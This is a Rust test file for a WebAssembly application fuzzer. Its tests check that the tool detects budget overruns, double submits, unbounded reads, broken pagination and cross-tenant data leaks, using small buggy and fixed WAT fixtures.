    let (_, mut malformed) = f.cli(&["show", "last"]);
    malformed["outcome"] = json!({"kind": "invalid"});
    assert_eq!(f.cli(&["envelope", "check", &malformed.to_string(), "--envelope", path]).0, 3);
    f.edit("\nrequest = 1\n", "\nrequest = 2\n");
    assert_eq!(f.cli(&["envelope", "check", "last", "--envelope", path]).0, 3);
}

#[test]
fn envelope_checks_budgets_even_without_guest_fuel() {
    let f = Fixture::new(false);
    let (code, review) = f.review();
    assert_eq!(code, 0, "{review}");
    let path = f.dir.join("envelope.json");
    let path = path.to_str().unwrap();
    assert_eq!(f.cli(&["envelope", "--out", path]).0, 0);
    let env: Value = serde_json::from_slice(&std::fs::read(path).unwrap()).unwrap();
    f.cli(&["run"]);
    let (_, mut trace) = f.cli(&["show", "last"]);
    trace["totals"]["fuel"] = json!(0);
    trace["totals"]["cost"] = json!(env["budget"]["cost"].as_u64().unwrap() * 2 + 1);
    let (code, checked) = f.cli(&["envelope", "check", &trace.to_string(), "--envelope", path]);
    assert_eq!(code, 1, "{checked}");
    assert!(checked["findings"].as_array().unwrap().iter().any(|f| f["detail"]["budget"] == "cost"));
}

#[test]
fn envelope_requires_output_and_complete_call_evidence() {
    for echo in [true, false] {
        let f = Fixture::new(echo);
        if echo {
            f.edit("request = \"safe\"", "request = \"safe\"\nvalues = { '' = 'enum:safe' }");
        }
        let (code, review) = f.review();
        assert_eq!(code, 0, "{review}");
        let path = f.dir.join("envelope.json");
        let path = path.to_str().unwrap();
        assert_eq!(f.cli(&["envelope", "--out", path]).0, 0);
        f.cli(&["run"]);
        let (_, record) = f.cli(&["show", "last"]);
        let trace = json!({
            "component":record["spec"]["component"], "contract":record["spec"]["contract"],
            "export":record["spec"]["export"], "args":record["spec"]["args"],
            "events":record["events"], "totals":record["totals"], "result":record["result"]
        });
        assert_eq!(f.cli(&["envelope", "check", &trace.to_string(), "--envelope", path]).0, 0);
        let mut malformed = trace.clone();
        if echo {
            malformed["result"] = json!({});
        } else {
            malformed["events"][0].as_object_mut().unwrap().remove("args");
        }
        let (code, checked) = f.cli(&["envelope", "check", &malformed.to_string(), "--envelope", path]);
        assert_eq!(code, 3, "incomplete evidence must not pass: {checked}");
        if echo {
            for empty_body in [json!(""), json!([])] {
                let mut valid = trace.clone();
                valid["result"] = empty_body;
                let (code, checked) = f.cli(&["envelope", "check", &valid.to_string(), "--envelope", path]);
                assert_eq!(code, 0, "an empty body is complete evidence: {checked}");
            }
        } else {
            malformed = trace.clone();
            malformed["events"] = json!([]);
            let (code, checked) = f.cli(&["envelope", "check", &malformed.to_string(), "--envelope", path]);
            assert_eq!(code, 3, "omitted calls must not pass: {checked}");
            malformed = trace.clone();
            malformed["totals"]["host_calls"] = json!(0);
            assert_eq!(f.cli(&["envelope", "check", &malformed.to_string(), "--envelope", path]).0, 3);
            malformed = trace.clone();
            malformed["events"][0]["func"] = json!("");
            assert_eq!(f.cli(&["envelope", "check", &malformed.to_string(), "--envelope", path]).0, 3);
        }
    }
}

#[test]
fn search_budget_and_cli_aliases_are_consistent() {
    let f = Fixture::new(false);
    let (code, r) = f.cli(&[
        "review",
        "--export",
        "run",
        "--request",
        "2",
        "--plan",
        "{\"test:workflow/db#get\":{\"return\":42}}",
        "--runs",
        "20",
        "--fresh",
        "--search-seed",
        "9",
        "--host-seed",
        "4",
    ]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["coverage"]["fuzz_runs"], 20);
    let (_, a) = f.cli(&["run", "run", "--seed", "2"]);
    let (_, b) = f.cli(&["run", "--export", "run", "--host-seed", "2", "--trace"]);
    assert_eq!(a["run"], b["run"]);
    let (_, calls) = f.cli(&["show", "last", "--view", "calls", "--fn", "get"]);
    let (_, old) = f.cli(&["calls", "last", "--func", "get"]);
    assert_eq!(calls["calls"], old["calls"]);
    assert_eq!(f.cli(&["findings", "--min", "typo"]).0, 3);
}

#[test]
fn comparison_cases_execute_the_recipe_against_the_current_build() {
    let f = Fixture::new(false);
    let original = std::fs::read(f.dir.join("app.wasm")).unwrap();
    let wit = "package test:workflow; interface db { get: func(id: u32) -> u32; } world app { import db; export run: func(n: u32) -> u32; }";
    let wat = r#"(module
        (import "test:workflow/db" "get" (func $get (param i32) (result i32)))
        (memory (export "memory") 1)
        (func (export "run") (param $n i32) (result i32) (local $i i32)
          (block $done (loop $next
            (br_if $done (i32.ge_u (local.get $i) (local.get $n)))
            (drop (call $get (local.get $i)))
            (local.set $i (i32.add (local.get $i) (i32.const 1)))
            (br $next))) (local.get $i)))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let (code, scaled) = f.cli(&["scale", "field:", "--sizes", "1,2,4,8,16,32,128"]);
    assert_eq!(code, 0, "{scaled}");
    let finding = scaled["findings"].as_array().unwrap().iter().find(|x| x["kind"] == "input_amplification").expect("growth finding");
    let (code, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "30"]);
    assert_eq!(code, 0, "{confirmed}");
    assert_eq!(confirmed["confirmed"], true);
    let case = confirmed["case"].as_str().unwrap();
    let (code, v) = f.cli(&["replay", case]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["reproduced"], true);
    std::fs::write(f.dir.join("app.wasm"), original).unwrap();
    let (code, v) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!(code, 0, "{v}");
    assert_eq!(v["reproduced"], false);
}

#[test]
fn unreadable_historical_evidence_cannot_turn_into_a_pass() {
    let f = Fixture::new(true);
    let (_, review) = f.review();
    assert_eq!(review["verdict"], "fail");
    let files: Vec<_> =
        std::fs::read_dir(f.dir.join("state/findings")).unwrap().map(|e| e.unwrap().path()).filter(|p| p.extension().is_some_and(|e| e == "json")).collect();
    assert_eq!(files.len(), 1);
    std::fs::write(&files[0], b"broken JSON").unwrap();
    let (code, v) = f.cli(&["review", "--fresh", "--runs", "10"]);
    assert_eq!(code, 3, "{v}");
    assert_eq!(v["verdict"], "incomplete");
}

#[test]
fn stored_finding_severity_is_upgraded() {
    use appfuzz_core::detect::{Finding, FindingStore, Severity};
    let f = Fixture::new(false);
    let store = FindingStore::new(&f.dir, "fixture");
    let hint = Finding::new("over_budget", "same", Severity::Info, "out-of-contract input".into(), json!({}), Some("r1"));
    store.add(&[hint]).unwrap();
    let fail = Finding::new("over_budget", "same", Severity::Fail, "valid input".into(), json!({}), Some("r2"));
    store.add(&[fail]).unwrap();
    let findings = store.all().unwrap();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].severity, Severity::Fail);
    assert_eq!(findings[0].run.as_deref(), Some("r2"));
}

#[test]
fn modeled_lists_lookups_scaling_and_fuzzing_share_one_world() {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { all: func() -> list<u32>; get: func(id:u32) -> option<u32>; } world app { import db; export run: func(n:u32) -> u32; }";
    let wat = r#"(module
        (import "test:workflow/db" "all" (func $all (param i32)))
        (import "test:workflow/db" "get" (func $get (param i32 i32)))
        (memory (export "memory") 4)
        (global $heap (mut i32) (i32.const 1024))
        (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
          (local $p i32) (local.set $p (global.get $heap))
          (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
        (func (export "run") (param i32) (result i32)
          (call $all (i32.const 0))
          (call $get (local.get 0) (i32.const 8))
          (i32.load (i32.const 4))))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, wat)).unwrap();
    let mut m = std::fs::read_to_string(&f.manifest).unwrap();
    m.push_str(
        r#"
[datasets.items]
rows = 3
key = "id"
template = { id = 1 }
[functions."test:workflow/db#all"]
query = { dataset = "items", select = "id" }
[functions."test:workflow/db#get"]
query = { dataset = "items", select = "id", filter = { id = "id" }, one = true }
"#,
    );
    std::fs::write(&f.manifest, m).unwrap();
    let (code, r) = f.cli(&["run", "--trace", "--plan", r#"{"test:workflow/db#get":{"return":999}}"#]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["outcome"]["kind"], "ok", "{r}");
    let (_, r) = f.cli(&["show", "last"]);
    assert_eq!(r["events"][0]["result"], json!([1, 2, 3]));
    assert_eq!(r["events"][1]["result"], 1);
    assert_eq!(f.cli(&["replay", "last"]).0, 0);
    let (code, r) = f.cli(&["run", "--trace", "--plan", r#"{"_defaults":{"dataset_rows":{"items":0}}}"#]);
    assert_eq!(code, 0, "{r}");
    assert_eq!(r["outcome"]["kind"], "ok", "{r}");
    let (_, r) = f.cli(&["show", "last"]);
    assert_eq!(r["events"][0]["result"], json!([]));
    assert!(r["events"][1]["result"].is_null());
    let (code, scaled) = f.cli(&["scale", "fn:db#all", "--sizes", "0,1,8"]);
    assert_eq!(code, 0, "{scaled}");
    let (code, fuzz) = f.cli(&["fuzz", "--runs", "80", "--fresh"]);
    assert_eq!(code, 0, "{fuzz}");
    let mut coherent = 0;
    for file in std::fs::read_dir(f.dir.join("state/runs")).unwrap() {
        let p = file.unwrap().path();
        if p.extension().and_then(|x| x.to_str()) != Some("json") {
            continue;
        }
        let r: Value = serde_json::from_slice(&std::fs::read(p).unwrap()).unwrap();
        if r["outcome"]["kind"] != "ok" {
            continue;
        }
        let events = r["events"].as_array().unwrap();
        if events.len() < 2 || events[0]["source"] != "dataset items" || events[1]["source"] != "dataset items" {
            continue;
        }
        coherent += 1;
        let all = events[0]["result"].as_array().unwrap();
        let got = &events[1]["result"];
        assert!(got.is_null() || all.contains(got), "{r}");
    }
    assert!(coherent >= 3);
    f.edit("rows = 3", "rows = 10");
    f.cli(&["run"]);
    let (code, checked) = f.cli(&["check", "value_range", "$", "0", "2", "--runs", "10"]);
    assert_eq!(code, 2, "{checked}");
    assert_eq!(checked["counterexample"]["plan"]["_defaults"]["dataset_rows"]["items"], 3, "{checked}");
    let (code, fault) = f.cli(&["run", "--plan", r#"{"test:workflow/db#all":{"trap":"unavailable"}}"#]);
    assert_eq!(code, 0, "{fault}");
    assert_eq!(fault["outcome"]["kind"], "host_trap");
    f.edit("template = { id = 1 }", "template = { id = 1, value = 1 }\nchoices = { value = [1, 2, 3] }");
    f.edit("select = \"id\"", "select = \"value\"");
    let (code, r) = f.cli(&["run"]);
    assert_eq!(code, 0, "{r}");
    let app = appfuzz_core::harness::App::load(appfuzz_core::manifest::Manifest::load(&f.manifest).unwrap()).unwrap();
    let store = appfuzz_core::store::RunStore::new(&f.dir.join("state"));
    let base = store.load("last").unwrap();
    for variant in appfuzz_core::metamorphic::variants(&app, &base).into_iter().filter(|v| v.change == appfuzz_core::metamorphic::Change::Seed) {
        let other = app.run(&variant.spec);
        assert_eq!(other.events[0].result, base.events[0].result);
        assert_eq!(other.events[1].result, base.events[1].result);
    }
    f.edit("choices = { value = [1, 2, 3] }", "choices = { value = [1, \"wrong type\"] }");
    assert_eq!(f.cli(&["inspect"]).0, 3);
}

fn booking_fixture(safe: bool) -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { create: func(slot:u32) -> result<bool,string>; update: func(id:u32,slot:u32) -> result<bool,string>; delete: func(id:u32) -> result<bool,string>; all: func() -> list<u32>; } world app { import db; export run: func(action:u32,slot:u32) -> u32; }";
    let wat = r#"(module
      (import "test:workflow/db" "create" (func $create (param i32 i32)))
      (import "test:workflow/db" "update" (func $update (param i32 i32 i32)))
      (import "test:workflow/db" "delete" (func $delete (param i32 i32)))
      (import "test:workflow/db" "all" (func $all (param i32)))
      (memory (export "memory") 4)
      (global $heap (mut i32) (i32.const 1024))
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
        (local $p i32) (local.set $p (global.get $heap))
        (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
      (func (export "run") (param $action i32) (param $slot i32) (result i32)
        (call $all (i32.const 32))
        (if (i32.eqz (local.get $action)) (then
          (if SAFE (then (call $create (local.get $slot) (i32.const 0))))))
        (if (i32.eq (local.get $action) (i32.const 1)) (then (call $update (i32.const 1) (local.get $slot) (i32.const 0))))
        (if (i32.eq (local.get $action) (i32.const 2)) (then (call $delete (local.get $slot) (i32.const 0))))
        (call $all (i32.const 32)) (i32.load (i32.const 36))))"#;
    let condition = if safe { "(i32.eqz (i32.load (i32.const 36)))" } else { "(i32.const 1)" };
    std::fs::write(f.dir.join("app.wasm"), component(wit, &wat.replace("SAFE", condition))).unwrap();
    let manifest = r#"
[app]
wasm = "app.wasm"
[entry]
export = "run"
request = [0,7]
[datasets.bookings]
rows = 0
key = "id"
template = { id = 1, slot = 1 }
[functions."test:workflow/db#all"]
query = { dataset = "bookings", select = "slot" }
[functions."test:workflow/db#create"]
effect = "write"
mutation = { dataset = "bookings", operation = "create", fields = { slot = "slot" }, response = { ok = true } }
[functions."test:workflow/db#update"]
effect = "write"
mutation = { dataset = "bookings", operation = "update", fields = { slot = "slot" }, filter = { id = "id" }, response = { ok = true } }
[functions."test:workflow/db#delete"]
effect = "delete"
mutation = { dataset = "bookings", operation = "delete", filter = { id = "id" }, response = { ok = true } }
"#;
    std::fs::write(&f.manifest, manifest).unwrap();
    f
}
fn scenario_file(f: &Fixture, scenario: Value) -> String {
    let path = f.dir.join("scenario.json");
    std::fs::write(&path, scenario.to_string()).unwrap();
    path.to_str().unwrap().to_string()
}
#[test]
fn sequences_persist_writes_find_double_submits_shrink_and_replay() {
    let f = booking_fixture(false);
    let path = scenario_file(&f, json!({"steps":[{"args":[3,0]},{"args":[0,7]}],"checks":[{"kind":"unique","dataset":"bookings","fields":["slot"]}]}));
    let (code, baseline) = f.cli(&["sequence", "run", &path]);
    assert_eq!(code, 0, "{baseline}");
    assert_eq!(baseline["records"][1]["result"], 1);
    let (code, failed) = f.cli(&["sequence", "fuzz", &path, "--runs", "10"]);
    assert_eq!(code, 2, "{failed}");
    assert_eq!(failed["records"].as_array().unwrap().len(), 2, "{failed}");
    assert_ne!(failed["records"][0]["id"], failed["records"][1]["id"]);
    assert_eq!(failed["states"][1]["tables"]["bookings"].as_array().unwrap().len(), 2);
    let case = failed["case"].as_str().unwrap();
    let (code, replay) = f.cli(&["sequence", "replay", case]);
    assert_eq!(code, 0, "{replay}");
    assert_eq!(replay["reproduced"], true);
    assert_legacy_finding_case_replays(&f, case, true);
    let fixed = booking_fixture(true);
    std::fs::copy(fixed.dir.join("app.wasm"), f.dir.join("app.wasm")).unwrap();
    assert_eq!(f.cli(&["sequence", "replay", case]).0, 3);
    let (code, replay) = f.cli(&["sequence", "replay", case, "--against-current"]);
    assert_eq!(code, 0, "{replay}");
    assert_eq!(replay["reproduced"], false);
}
#[test]
fn sequence_crud_faults_bindings_and_bad_requests() {
    let f = booking_fixture(false);
    let path = scenario_file(&f, json!({"steps":[{"args":[0,7]},{"args":[1,9]},{"args":[2,1]}]}));
    let (code, report) = f.cli(&["sequence", "run", &path]);
    assert_eq!(code, 0, "{report}");
    assert_eq!(report["states"][1]["tables"]["bookings"][0]["slot"], 9);
    assert_eq!(report["states"][2]["tables"]["bookings"], json!([]));
    // Each record says what its write changed and how much the reads returned.
    let events = |step: usize| report["records"][step]["events"].as_array().unwrap().clone();
    assert_eq!(events(0)[0]["result_items"], 0, "{report}");
    assert_eq!(events(0)[1]["commit"], json!({"rows":[{"dataset":"bookings","key":1,"after":{"id":1,"slot":7}}]}), "{report}");
    assert_eq!(events(0)[2]["result_items"], 1);
    assert!(events(0)[2]["result_bytes"].as_u64().unwrap() > 0);
    assert_eq!(events(1)[1]["commit"]["rows"][0]["before"]["slot"], 7);
    assert_eq!(events(1)[1]["commit"]["rows"][0]["after"]["slot"], 9);
    assert_eq!(events(2)[1]["commit"]["rows"][0]["after"], Value::Null);
    assert_eq!(report["records"][0]["totals"]["host_result_items"], 1);
    let path = scenario_file(
        &f,
        json!({"steps":[{"args":[0,7],"plan":{"test:workflow/db#create":{"commit_then_trap":"response lost"}}},{"args":[0,7]}],"checks":[{"kind":"unique","dataset":"bookings","fields":["slot"]}]}),
    );
    let (code, report) = f.cli(&["sequence", "run", &path]);
    assert_eq!(code, 2, "{report}");
    assert_eq!(report["records"][0]["outcome"]["kind"], "host_trap");
    assert_eq!(report["records"][0]["events"][1]["commit"]["lost"], true, "{report}");
    assert_eq!(report["states"][0]["tables"]["bookings"].as_array().unwrap().len(), 1);
    assert_eq!(report["states"][1]["tables"]["bookings"].as_array().unwrap().len(), 2);
    let path = scenario_file(&f, json!({"steps":[{"args":[0,7]},{"args":[2,0],"args_from":{"/1":"/0/result"}}]}));
    let (code, report) = f.cli(&["sequence", "run", &path]);
    assert_eq!(code, 0, "{report}");
    assert_eq!(report["states"][1]["tables"]["bookings"], json!([]));
    let path = scenario_file(&f, json!({"steps":[{"args":["bad",0]}]}));
    assert_eq!(f.cli(&["sequence", "run", &path]).0, 3);
    assert_eq!(f.cli(&["sequence", "fuzz", &path, "--runs", "0"]).0, 3);
}

#[test]
fn retry_after_precommit_failure_is_not_an_idempotency_violation() {
    let f = booking_fixture(false);
    let path = scenario_file(
        &f,
        json!({"steps":[{"args":[0,7],"plan":{"test:workflow/db#create":{"trap":"not committed"}}},{"args":[0,7]}],"checks":[{"kind":"idempotent","dataset":"bookings"}]}),
    );
    let (code, report) = f.cli(&["sequence", "run", &path]);
    assert_eq!(code, 0, "{report}");
    assert_eq!(report["states"][0]["tables"]["bookings"], json!([]));
    assert_eq!(report["states"][1]["tables"]["bookings"].as_array().unwrap().len(), 1);
    let path = scenario_file(&f, json!({"steps":[{"args":[0,7]},{"args":[0,7]}],"checks":[{"kind":"idempotent","dataset":"bookings"}]}));
    assert_eq!(f.cli(&["sequence", "run", &path]).0, 2);
}

/// `run(mode)`: 0 adds the first two ids of all customers (the bug, or of
/// the first page when `paged`), 1 adds them all up (an aggregate).
fn customers_fixture(paged: bool) -> Fixture {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { all: func() -> list<u32>; page: func(offset:u32) -> list<u32>; } world app { import db; export run: func(mode:u32) -> u32; }";
    let wat = r#"(module
      (import "test:workflow/db" "all" (func $all (param i32)))
      (import "test:workflow/db" "page" (func $page (param i32 i32)))
      (memory (export "memory") 4)
      (global $heap (mut i32) (i32.const 1024))
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
        (local $p i32) (local.set $p (global.get $heap))
        (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
      (func (export "run") (param $mode i32) (result i32)
        (local $i i32) (local $sum i32) (local $p i32) (local $n i32)
        (if (i32.and (i32.eqz (local.get $mode)) (i32.const PAGED))
          (then (call $page (i32.const 0) (i32.const 32)))
          (else (call $all (i32.const 32))))
        (local.set $p (i32.load (i32.const 32)))
        (local.set $n (i32.load (i32.const 36)))
        (if (i32.eq (local.get $mode) (i32.const 1)) (then
          (block $done (loop $next
            (br_if $done (i32.ge_u (local.get $i) (local.get $n)))
            (local.set $sum (i32.add (local.get $sum) (i32.load (i32.add (local.get $p) (i32.shl (local.get $i) (i32.const 2))))))
            (local.set $i (i32.add (local.get $i) (i32.const 1)))
            (br $next)))
          (return (local.get $sum))))
        (i32.add (i32.load (local.get $p)) (i32.load (i32.add (local.get $p) (i32.const 4))))))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, &wat.replace("PAGED", if paged { "1" } else { "0" }))).unwrap();
    let manifest = r#"
[app]
wasm = "app.wasm"
[entry]
export = "run"
request = 0
[datasets.customers]
rows = 4
key = "id"
template = { id = 1 }
[functions."test:workflow/db#all"]
query = { dataset = "customers", select = "id" }
[functions."test:workflow/db#page"]
query = { dataset = "customers", select = "id", page = { offset = "offset", max = 2 } }
"#;
    std::fs::write(&f.manifest, manifest).unwrap();
    f
}

#[test]
fn reading_every_row_for_a_fixed_size_answer_is_an_unbounded_read() {
    let f = customers_fixture(false);
    let (code, scaled) = f.cli(&["scale", "fn:db#all", "--points"]);
    assert_ne!(code, 3, "{scaled}");
    let finding = scaled["findings"].as_array().unwrap().iter().find(|x| x["kind"] == "unbounded_read").expect("unbounded read").clone();
    assert_eq!(finding["severity"], "warn", "{finding}");
    let title = finding["title"].as_str().unwrap();
    assert!(title.contains("returns all n rows") && title.contains("dropping the middle or last row changes nothing"), "{title}");
    assert!(title.contains("db#page reads pages of up to 2"), "{title}");
    assert_eq!(scaled["points"][0]["rows"]["test:workflow/db#all"], 1, "{scaled}");
    let (code, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "40"]);
    assert_eq!(code, 0, "{confirmed}");
    assert_eq!(confirmed["confirmed"], true, "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let saved: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    let dropped = &saved["finding"]["detail"]["dropped"];
    assert_eq!((&dropped[0]["row"], &dropped[0]["unchanged"], &dropped[2]["unchanged"]), (&json!("first"), &json!(false), &json!(true)), "{saved}");
    let (code, v) = f.cli(&["replay", case]);
    assert_eq!((code, &v["reproduced"]), (0, &json!(true)), "{v}");
    // The fixed app reads one page: the finding is gone.
    std::fs::copy(customers_fixture(true).dir.join("app.wasm"), f.dir.join("app.wasm")).unwrap();
    let (code, v) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!((code, &v["reproduced"]), (0, &json!(false)), "{v}");
    let (_, scaled) = f.cli(&["scale", "fn:db#page"]);
    assert!(scaled["findings"].as_array().unwrap().iter().all(|x| x["kind"] != "unbounded_read"), "{scaled}");
    // An aggregate needs every row: only a hint.
    let (_, scaled) = f.cli(&["scale", "fn:db#all", "--args", "[1]"]);
    let finding = scaled["findings"].as_array().unwrap().iter().find(|x| x["kind"] == "unbounded_read").expect("aggregate hint");
    assert_eq!(finding["severity"], "info", "{finding}");
    assert!(finding["title"].as_str().unwrap().contains("each dropped row changes it"), "{finding}");
}

/// `run` adds up the ids of every item, a page of 4 at a time, and moves on
/// as `step` says: `stop` ends at a page shorter than asked, `skip` counts
/// offsets by what it asked for, `follow` by what it got.
fn pages_fixture(f: &Fixture, step: &str) {
    let wit =
        "package test:workflow; interface db { page: func(offset:u32, limit:u32) -> list<u32>; } world app { import db; export run: func(mode:u32) -> u32; }";
    let step = match step {
        "stop" => "(br_if $done (i32.lt_u (local.get $n) (i32.const 4))) (local.set $off (i32.add (local.get $off) (i32.const 4)))",
        "skip" => "(local.set $off (i32.add (local.get $off) (i32.const 4)))",
        _ => "(local.set $off (i32.add (local.get $off) (local.get $n)))",
    };
    let wat = r#"(module
      (import "test:workflow/db" "page" (func $page (param i32 i32 i32)))
      (memory (export "memory") 4)
      (global $heap (mut i32) (i32.const 1024))
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
        (local $p i32) (local.set $p (global.get $heap))
        (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
      (func (export "run") (param $mode i32) (result i32)
        (local $off i32) (local $sum i32) (local $p i32) (local $n i32) (local $i i32)
        (block $done (loop $next
          (call $page (local.get $off) (i32.const 4) (i32.const 32))
          (local.set $p (i32.load (i32.const 32)))
          (local.set $n (i32.load (i32.const 36)))
          (br_if $done (i32.eqz (local.get $n)))
          (local.set $i (i32.const 0))
          (block $sum_done (loop $sum_next
            (br_if $sum_done (i32.ge_u (local.get $i) (local.get $n)))
            (local.set $sum (i32.add (local.get $sum) (i32.load (i32.add (local.get $p) (i32.shl (local.get $i) (i32.const 2))))))
            (local.set $i (i32.add (local.get $i) (i32.const 1)))
            (br $sum_next)))
          STEP
          (br $next)))
        (local.get $sum)))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, &wat.replace("STEP", step))).unwrap();
}

#[test]
fn an_app_that_stops_at_a_short_page_or_skips_rows_breaks_pagination() {
    let f = Fixture::new(false);
    let manifest = r#"
[app]
wasm = "app.wasm"
[entry]
export = "run"
request = 0
[datasets.items]
rows = 10
key = "id"
template = { id = 1 }
[functions."test:workflow/db#page"]
query = { dataset = "items", select = "id", page = { offset = "offset", limit = "limit", max = 4, short = true } }
"#;
    std::fs::write(&f.manifest, manifest).unwrap();
    let pairs = |f: &Fixture| {
        let (_, r) = f.cli(&["run"]);
        assert_eq!(r["result"], 55, "{r}");
        let (_, out) = f.cli(&["probe", "pairs", r["run"].as_str().unwrap()]);
        out["findings"].as_array().unwrap().iter().filter(|x| x["kind"] == "broken_pagination").cloned().collect::<Vec<_>>()
    };
    pages_fixture(&f, "stop");
    let found = pairs(&f);
    let finding = found.iter().find(|x| x["title"].as_str().unwrap().contains("returns pages of")).unwrap_or_else(|| panic!("{found:?}")).clone();
    assert_eq!(finding["severity"], "fail", "{finding}");
    assert!(
        finding["title"].as_str().unwrap().contains("returns pages of 1 (it asked for 4): it reads 1 of the 10 rows and stops at a short page"),
        "{finding}"
    );
    let (code, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "60"]);
    assert_eq!((code, &confirmed["confirmed"]), (0, &json!(true)), "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let saved: Value = serde_json::from_slice(&std::fs::read(case).unwrap()).unwrap();
    // The smallest world that still shows it: one full page and the next.
    assert!(saved.to_string().contains(r#""dataset_rows":{"items":4}"#), "{saved}");
    let (code, v) = f.cli(&["replay", case]);
    assert_eq!((code, &v["reproduced"]), (0, &json!(true)), "{v}");
    // Counting offsets by the rows asked for skips the rest of a short page.
    pages_fixture(&f, "skip");
    let found = pairs(&f);
    assert!(found.iter().any(|x| x["title"].as_str().unwrap().contains("never reads rows 1 to 3 of test:workflow/db#page")), "{found:?}");
    // Following what the platform returned reads every row.
    pages_fixture(&f, "follow");
    assert!(pairs(&f).is_empty());
    let (code, v) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!((code, &v["reproduced"]), (0, &json!(false)), "{v}");
}

/// `run` adds up deal amounts: of every deal, or (`mine`) of the caller's,
/// user 1, the first user deals belong to.
fn deals_fixture(f: &Fixture, mine: bool) {
    let wit = "package test:workflow; interface db { all: func() -> list<u32>; mine: func(owner:u32) -> list<u32>; } world app { import db; export run: func(mode:u32) -> u32; }";
    let wat = r#"(module
      (import "test:workflow/db" "all" (func $all (param i32)))
      (import "test:workflow/db" "mine" (func $mine (param i32 i32)))
      (memory (export "memory") 4)
      (global $heap (mut i32) (i32.const 1024))
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
        (local $p i32) (local.set $p (global.get $heap))
        (global.set $heap (i32.add (global.get $heap) (local.get 3))) (local.get $p))
      (func (export "run") (param $mode i32) (result i32)
        (local $i i32) (local $sum i32) (local $p i32) (local $n i32)
        (if (i32.const MINE) (then (call $mine (i32.const 1) (i32.const 32))) (else (call $all (i32.const 32))))
        (local.set $p (i32.load (i32.const 32)))
        (local.set $n (i32.load (i32.const 36)))
        (block $done (loop $next
          (br_if $done (i32.ge_u (local.get $i) (local.get $n)))
          (local.set $sum (i32.add (local.get $sum) (i32.load (i32.add (local.get $p) (i32.shl (local.get $i) (i32.const 2))))))
          (local.set $i (i32.add (local.get $i) (i32.const 1)))
          (br $next)))
        (local.get $sum)))"#;
    std::fs::write(f.dir.join("app.wasm"), component(wit, &wat.replace("MINE", if mine { "1" } else { "0" }))).unwrap();
}

#[test]
fn an_answer_that_changes_with_other_users_records_is_a_tenant_leak() {
    let f = Fixture::new(false);
    let manifest = r#"
[app]
wasm = "app.wasm"
[entry]
export = "run"
request = 0
[datasets.users]
rows = 2
key = "id"
template = { id = 1 }
[datasets.deals]
rows = 6
key = "id"
template = { id = 1, owner = 1, amount = 10 }
references = { owner = "users" }
owner = "owner"
choices = { amount = [10, 20, 40] }
[functions."test:workflow/db#all"]
query = { dataset = "deals", select = "amount" }
[functions."test:workflow/db#mine"]
query = { dataset = "deals", filter = { owner = "owner" }, select = "amount" }
"#;
    std::fs::write(&f.manifest, manifest).unwrap();
    let leaks = |f: &Fixture| {
        let (_, r) = f.cli(&["run"]);
        let (_, out) = f.cli(&["probe", "pairs", r["run"].as_str().unwrap()]);
        out["findings"].as_array().unwrap().iter().filter(|x| x["kind"] == "tenant_leak").cloned().collect::<Vec<_>>()
    };
    deals_fixture(&f, false);
    let found = leaks(&f);
    let [finding] = found.as_slice() else { panic!("{found:?}") };
    assert_eq!(finding["severity"], "fail", "{finding}");
    assert!(finding["title"].as_str().unwrap().starts_with("the answer of run for 1 changes when only other users' deals change"), "{finding}");
    let (code, confirmed) = f.cli(&["confirm", finding["id"].as_str().unwrap(), "--max-runs", "60"]);
    assert_eq!((code, &confirmed["confirmed"]), (0, &json!(true)), "{confirmed}");
    let case = confirmed["case"].as_str().unwrap();
    let saved: Value = serde_json::from_str(&std::fs::read_to_string(case).unwrap()).unwrap();
    // Fewer deals than the manifest's 6 still show the leak.
    assert!(saved["spec"]["plan"]["_defaults"]["dataset_rows"]["deals"].as_u64().is_some_and(|n| n < 6), "{saved}");
    let (code, v) = f.cli(&["replay", case]);
    assert_eq!((code, &v["reproduced"]), (0, &json!(true)), "{v}");
    // The caller's own deals only: other users' deals change nothing.
    deals_fixture(&f, true);
    assert!(leaks(&f).is_empty());
    let (code, v) = f.cli(&["replay", case, "--against-current"]);
    assert_eq!((code, &v["reproduced"]), (0, &json!(false)), "{v}");
    // Amounts everyone may see: adding them all up is no leak.
    deals_fixture(&f, false);
    f.edit("owner = \"owner\"\nchoices", "owner = \"owner\"\npublic = [\"amount\"]\nchoices");
    assert!(leaks(&f).is_empty());
}

#[test]
fn plans_edit_the_world_and_paged_queries_answer_a_page_at_a_time() {
    let f = Fixture::new(false);
    let wit = "package test:workflow; interface db { page: func(offset:u32) -> list<u32>; } world app { import db; export run: func(offset:u32) -> u32; }";
    let wat = r#"(module
      (import "test:workflow/db" "page" (func $page (param i32 i32)))
      (memory (export "memory") 4)
      (global $heap (mut i32) (i32.const 1024))
      (func (export "cabi_realloc") (param i32 i32 i32 i32) (result i32)
        (local $p i32) (local.set $p (global.get $heap))
